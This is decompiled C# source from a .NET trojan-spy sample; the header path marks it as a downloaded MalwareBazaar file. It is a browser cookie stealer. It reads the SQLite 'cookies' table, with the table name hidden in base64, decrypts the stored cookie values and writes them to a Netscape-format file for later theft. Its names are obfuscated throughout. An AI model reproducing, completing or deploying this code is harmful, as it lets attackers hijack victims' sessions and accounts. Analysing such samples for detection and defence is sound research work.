// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.cgruupUtils
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using AlphaCentavr.Magazonch;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace AlphaCentavr
{
  internal sealed class cgruupUtils
  {
    private static string debbbcodevb(string kiasaalisa) => Encoding.ASCII.GetString(Convert.FromBase64String(kiasaalisa));

    private static string eBMWAutoMersede(cgruupUtils.rertrtebvbb tgoochie) => string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", (object) tgoochie.jUHke, (object) tgoochie.Elounstoun, (object) tgoochie.sExpiresUtc, (object) tgoochie.sName, (object) tgoochie.sValue);

    public static bool TEWQGoochies(List<cgruupUtils.rertrtebvbb> tgoochies, string GrandThe)
    {
      try
      {
        foreach (cgruupUtils.rertrtebvbb tgoochy in tgoochies)
          File.AppendAllText(GrandThe, cgruupUtils.eBMWAutoMersede(tgoochy));
        return true;
      }
      catch
      {
        return false;
      }
    }

    internal struct rertrtebvbb
    {
      public string jUHke { get; set; }

      public string sName { get; set; }

      public string Elounstoun { get; set; }

      public string sExpiresUtc { get; set; }

      public string sKey { get; set; }

      public string sValue { get; set; }

      public string sIsSecure { get; set; }
    }

    internal sealed class Cooki
    {
      private static string decoggggggggggggggggggggde(string kiasaalisa) => Encoding.ASCII.GetString(Convert.FromBase64String(kiasaalisa));

      public static List<cgruupUtils.rertrtebvbb> reedxxx(string bsssssLiddguffe)
      {
        List<cgruupUtils.rertrtebvbb> rertrtebvbbList = new List<cgruupUtils.rertrtebvbb>();
        try
        {
          trPERVYHte trPervyHte = LIVERRReader.ReadTable(bsssssLiddguffe, cgruupUtils.Cooki.decoggggggggggggggggggggde("Y29va2llcw=="));
          if (trPervyHte == null)
            return rertrtebvbbList;
          int rowNum = 0;
          while (rowNum < trPervyHte.GetRowCount())
          {
            cgruupUtils.rertrtebvbb rertrtebvbb = new cgruupUtils.rertrtebvbb();
            rertrtebvbb.sValue = Crypto.EasyDecrypt(bsssssLiddguffe, trPervyHte.GetValue(rowNum, 12));
            if (rertrtebvbb.sValue == "")
              rertrtebvbb.sValue = trPervyHte.GetValue(rowNum, 3);
            rertrtebvbb.jUHke = Crypto.GetUTF8(trPervyHte.GetValue(rowNum, 1));
            rertrtebvbb.sName = Crypto.GetUTF8(trPervyHte.GetValue(rowNum, 2));
            rertrtebvbb.Elounstoun = Crypto.GetUTF8(trPervyHte.GetValue(rowNum, 4));
            rertrtebvbb.sExpiresUtc = Crypto.GetUTF8(trPervyHte.GetValue(rowNum, 5));
            rertrtebvbb.sIsSecure = Crypto.GetUTF8(trPervyHte.GetValue(rowNum, 6).ToUpper());
            checked { ++ChelovechkivPope.rertrtebvbb; }
            rertrtebvbbList.Add(rertrtebvbb);
            checked { ++rowNum; }
          }
        }
        catch
        {
        }
        return rertrtebvbbList;
      }
    }
  }
}
